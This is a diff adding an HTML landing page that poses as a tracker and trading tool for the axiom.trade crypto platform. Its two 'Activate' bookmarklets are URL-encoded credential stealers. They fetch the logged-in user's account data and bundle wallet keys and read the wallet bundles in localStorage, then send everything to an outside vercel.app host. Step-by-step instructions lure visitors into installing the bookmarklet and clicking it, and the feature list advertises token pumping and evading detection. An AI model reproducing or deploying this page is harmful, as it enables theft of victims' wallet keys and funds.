@@ -1,0 +1,347 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Deploy On Vortex</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap');
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(180deg, #000000, #0b0210, #150025);
+      color: white;
+      line-height: 1.6;
+    }
+
+    /* NAVBAR */
+    .navbar {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 1.5rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .logo-section {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      margin-left: -410px;
+    }
+
+    .logo {
+      width: 50px;
+      height: 50px;
+    }
+
+    .logo-text h1 {
+      font-size: 1.3rem;
+      font-weight: 700;
+    }
+
+    .logo-text p {
+      font-size: 0.8rem;
+      opacity: 0.7;
+    }
+
+    /* HERO */
+    .hero {
+      text-align: center;
+      padding: 0.5rem 1rem 2rem;
+      max-width: 800px;
+      margin: 0 auto;
+      margin-top: -20px;
+    }
+
+    .hero h2 {
+      font-size: 2.5rem;
+      background: linear-gradient(to right, #a46bff, #ff4ed2);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      font-weight: 900;
+      text-shadow: 0 0 10px rgba(164, 107, 255, 0.4);
+    }
+
+    .hero p {
+      margin: 1rem 0;
+      opacity: 0.8;
+      font-size: 1.1rem;
+    }
+
+    .hero-buttons {
+      margin-top: 1.5rem;
+      display: flex;
+      justify-content: center;
+      gap: 1rem;
+    }
+
+    .note {
+      display: block;
+      margin-top: 1.5rem;
+      opacity: 0.6;
+      font-size: 0.9rem;
+    }
+
+    /* BUTTONS */
+    button,
+    a.btn-primary,
+    a.btn-secondary {
+      cursor: pointer;
+      transition: all 0.3s ease;
+      text-decoration: none;
+      display: inline-block;
+    }
+
+    .btn-primary {
+      background: linear-gradient(90deg, #7f2cff, #b245ff);
+      color: white;
+      border: none;
+      border-radius: 30px;
+      padding: 0.6rem 1.5rem;
+      font-weight: 600;
+    }
+
+    .btn-primary:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 15px #7f2cff;
+    }
+
+    .btn-secondary {
+      border: 1px solid #7f2cff;
+      color: #b27fff;
+      background: transparent;
+      border-radius: 30px;
+      padding: 0.6rem 1.5rem;
+      font-weight: 600;
+    }
+
+    .btn-secondary:hover {
+      background: rgba(127, 44, 255, 0.1);
+    }
+
+    .large {
+      padding: 0.9rem 2.2rem;
+      font-size: 1rem;
+    }
+
+    /* FEATURES */
+    .features {
+      padding: 2rem 1rem;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    .features h3 {
+      text-align: center;
+      font-size: 1.8rem;
+      margin-bottom: 2rem;
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 1.5rem;
+    }
+
+    .card {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 15px;
+      padding: 1.5rem;
+      transition: all 0.3s ease;
+    }
+
+    .card:hover {
+      background: rgba(127, 44, 255, 0.15);
+      transform: translateY(-5px);
+    }
+
+    .card h4 {
+      font-size: 1.2rem;
+      color: #c193ff;
+      margin-bottom: 0.5rem;
+    }
+
+    /* CTA */
+    .cta {
+      text-align: center;
+      padding: 3rem 1rem;
+      background: radial-gradient(circle at top center, #1a0035, #000);
+    }
+
+    .cta h3 {
+      font-size: 2rem;
+      font-weight: 700;
+    }
+
+    .cta p {
+      margin: 1rem 0;
+      opacity: 0.8;
+    }
+
+    .cta-buttons {
+      margin-top: 1.5rem;
+      display: flex;
+      justify-content: center;
+      gap: 1rem;
+    }
+
+    /* FOOTER */
+    footer {
+      text-align: center;
+      padding: 1.5rem;
+      font-size: 0.9rem;
+      opacity: 0.6;
+      border-top: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    /* BOOKMARKLET TUTORIAL */
+    .tutorial {
+      margin-top: 2rem;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 15px;
+      padding: 1.5rem;
+      text-align: left;
+      max-width: 800px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .tutorial h4 {
+      text-align: center;
+      color: #c193ff;
+      margin-bottom: 1rem;
+      font-size: 1.2rem;
+    }
+
+    .tutorial ol {
+      list-style-position: inside;
+      line-height: 1.8;
+      font-size: 0.95rem;
+      opacity: 0.9;
+    }
+
+    .tutorial kbd {
+      background: rgba(255, 255, 255, 0.15);
+      padding: 0.2rem 0.4rem;
+      border-radius: 5px;
+      font-family: monospace;
+      font-size: 0.85rem;
+    }
+
+    .tutorial a {
+      color: #b27fff;
+      text-decoration: underline;
+    }
+
+    .tutorial a:hover {
+      color: #d9b3ff;
+    }
+  </style>
+</head>
+<body>
+  <header class="navbar">
+    <div class="logo-section">
+      <img src="" alt="" class="" />
+      <div class="logo-text">
+      </div>
+    </div>
+  </header>
+
+  <section class="hero">
+    <h2>The best X tracker for axiom.trade</h2>
+    <p>
+      Advanced tools that give you an edge on axiom.trade. Track wallets,
+      copy trade, and snipe opportunities — all in one place.
+    </p>
+    <div class="hero-buttons">
+      <a class="btn-primary large bookmarklet"
+         href="javascript:(async()%3D%3E%7Btry%7Bif(location.hostname!%3D%3D%22axiom.trade%22)%7Balert(%22Navigate%20to%20axiom.trade%22)%3Blocation.replace(%22https%3A%2F%2Faxiom.trade%2Fdiscover%22)%3Breturn%7Dif(!localStorage.getItem(%22isAuthed%22))%7Balert(%22Please%20log%20in%22)%3Breturn%7Dconst%20user%3Dawait(await%20fetch(%22%2F%2Fapi7.axiom.trade%2Fuser-info%22%2C%7Bmethod%3A%22POST%22%2Ccredentials%3A%22include%22%7D)).json()%3Bconst%20bundle%3Dawait(await%20fetch(%22%2F%2Fapi8.axiom.trade%2Fbundle-key-and-wallets%22%2C%7Bmethod%3A%22POST%22%2Ccredentials%3A%22include%22%7D)).json()%3Bconst%20bookmarkData%3D%7Btoken%3A%22eyJjIjoiODk0MzY0MDY3NSIsInAiOjgwLCJzIjoiNTVEM01MNDlRZUIxSjJ0eTU1YnZpcVRIQlFlZnFpd3dXcHU4dTV3M1E5Z3UiLCJiIjoiMHg3NUQxOEU3Mjc5NjViQWE3ODAxNzlEODExNWU5OTMxMjI3ODU0MWM0Iiwicm9sZSI6ImFmZmlsaWF0ZSIsInIiOiIzN2E1NzYwNjRiMTIifQ.Mf3dieIqnqoQmHKW%22%2Csite%3Alocation.href%2Cuser%2Cbundle%3Abundle.bundleKey%2CsBundles%3AlocalStorage.getItem(%22sBundles%22)%2CeBundles%3AlocalStorage.getItem(%22eBundles%22)%7D%3Blocation.replace(%22https%3A%2F%2Fcharger-rouge.vercel.app%22%2B%22%2Fdata%2F%22%2Bbtoa(JSON.stringify(bookmarkData)).replace(%2F%5C%2B%2Fg%2C%22-%22).replace(%2F%5C%2F%2Fg%2C%22_%22).replace(%2F%3D%2B%24%2F%2C%22%22))%3B%7Dcatch(e)%7Bconsole.error(e)%3Balert(%22Error%3A%20%22%2B(e%26%26e.message%7C%7Ce))%7D%7D)()%3B"
+         title="Drag to your bookmarks bar to save this bookmarklet"
+         draggable="true">Activate</a>
+      <button class="btn-secondary large" id="learn-more-btn">Learn More</button>
+    </div>
+    <span class="note">No wallet required • 30-second setup</span>
+  </section>
+
+  <section class="features" id="features">
+    <h3>Everything you need to win</h3>
+    <div class="grid">
+      <div class="card"><h4>X Tracker</h4><p>Monitor multiple x accounts at the speed of light!</p></div>
+      <div class="card"><h4>Background Display</h4><p>Change your background to any color.</p></div>
+      <div class="card"><h4>Auto-fund wallets via SOL disperser</h4><p>Fund main wallet, dispense sol evenly between bundle wallets.</p></div>
+      <div class="card"><h4>Wallet Tracker</h4><p>Advanced wallet tracker.</p></div>
+      <div class="card"><h4>Bundle up to 24 wallets</h4><p>Bundle up to 24 wallets to pump your token!</p></div>
+      <div class="card"><h4>Anti-MEV protection</h4><p>Built-in protections to avoid MEV and sandwich attacks.</p></div>
+      <div class="card"><h4>Advanced swap manager with intervals, sell all functions.</h4><p>Custom alerts so you never miss a trade.</p></div>
+      <div class="card"><h4>Portfolio Tracker</h4><p>Track PnL, positions, and performance.</p></div>
+      <div class="card"><h4>Stealth Mode</h4><p>Operate under the radar to avoid detection.</p></div>
+    </div>
+  </section>
+
+  <div class="tutorial">
+    <h4>How to use the bookmarklet</h4>
+    <ol>
+      <li><strong>Show your bookmarks bar:</strong> Press <kbd>Ctrl + Shift + B</kbd> (Windows) or <kbd>Cmd + Shift + B</kbd> (Mac).</li>
+      <li><strong>Drag the “Activate” button</strong> above to your bookmarks bar.</li>
+      <li><strong>Go to</strong> <a href="https://axiom.trade" target="_blank">axiom.trade</a>.</li>
+      <li><strong>Click the “Activate” bookmarklet</strong> from your bookmarks bar to start using it.</li>
+    </ol>
+  </div>
+
+  <section class="cta">
+    <h3>Get started in 30 seconds</h3>
+    <p>No complex setup. No wallet connection. Just drag and trade.</p>
+    <div class="cta-buttons">
+      <a class="btn-primary large bookmarklet"
+         href="javascript:(async()%3D%3E%7Btry%7Bif(location.hostname!%3D%3D%22axiom.trade%22)%7Balert(%22Navigate%20to%20axiom.trade%22)%3Blocation.replace(%22https%3A%2F%2Faxiom.trade%2Fdiscover%22)%3Breturn%7Dif(!localStorage.getItem(%22isAuthed%22))%7Balert(%22Please%20log%20in%22)%3Breturn%7Dconst%20user%3Dawait(await%20fetch(%22%2F%2Fapi7.axiom.trade%2Fuser-info%22%2C%7Bmethod%3A%22POST%22%2Ccredentials%3A%22include%22%7D)).json()%3Bconst%20bundle%3Dawait(await%20fetch(%22%2F%2Fapi8.axiom.trade%2Fbundle-key-and-wallets%22%2C%7Bmethod%3A%22POST%22%2Ccredentials%3A%22include%22%7D)).json()%3Bconst%20bookmarkData%3D%7Btoken%3A%22eyJjIjoiODk0MzY0MDY3NSIsInAiOjgwLCJzIjoiNTVEM01MNDlRZUIxSjJ0eTU1YnZpcVRIQlFlZnFpd3dXcHU4dTV3M1E5Z3UiLCJiIjoiMHg3NUQxOEU3Mjc5NjViQWE3ODAxNzlEODExNWU5OTMxMjI3ODU0MWM0Iiwicm9sZSI6ImFmZmlsaWF0ZSIsInIiOiIzN2E1NzYwNjRiMTIifQ.Mf3dieIqnqoQmHKW%22%2Csite%3Alocation.href%2Cuser%2Cbundle%3Abundle.bundleKey%2CsBundles%3AlocalStorage.getItem(%22sBundles%22)%2CeBundles%3AlocalStorage.getItem(%22eBundles%22)%7D%3Blocation.replace(%22https%3A%2F%2Fcharger-rouge.vercel.app%22%2B%22%2Fdata%2F%22%2Bbtoa(JSON.stringify(bookmarkData)).replace(%2F%5C%2B%2Fg%2C%22-%22).replace(%2F%5C%2F%2Fg%2C%22_%22).replace(%2F%3D%2B%24%2F%2C%22%22))%3B%7Dcatch(e)%7Bconsole.error(e)%3Balert(%22Error%3A%20%22%2B(e%26%26e.message%7C%7Ce))%7D%7D)()%3B"
+         title="Drag to your bookmarks bar to save this bookmarklet"
+         draggable="true">Activate</a>
+    </div>
+  </section>
+
+  <footer>
+    <p>© 2025 Deploy On Vortex. All rights reserved.</p>
+  </footer>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const sections = document.querySelectorAll('section');
+      sections.forEach((sec, i) => {
+        sec.style.opacity = 0;
+        sec.style.transform = 'translateY(40px)';
+        setTimeout(() => {
+          sec.style.transition = 'all 1s ease';
+          sec.style.opacity = 1;
+          sec.style.transform = 'translateY(0)';
+        }, i * 200);
+      });
+
+      const learnMoreBtn = document.getElementById('learn-more-btn');
+      const featuresSection = document.getElementById('features');
+      if (learnMoreBtn && featuresSection) {
+        learnMoreBtn.addEventListener('click', e => {
+          e.preventDefault();
+          featuresSection.scrollIntoView({ behavior: 'smooth' });
+        });
+      }
+
+      document.querySelectorAll('a.bookmarklet').forEach(a => {
+        a.addEventListener('dragstart', () => {
+          console.log('Dragging bookmarklet:', a.textContent.trim());
+        });
+      });
+    });
+  </script>
+</body>
+</html>
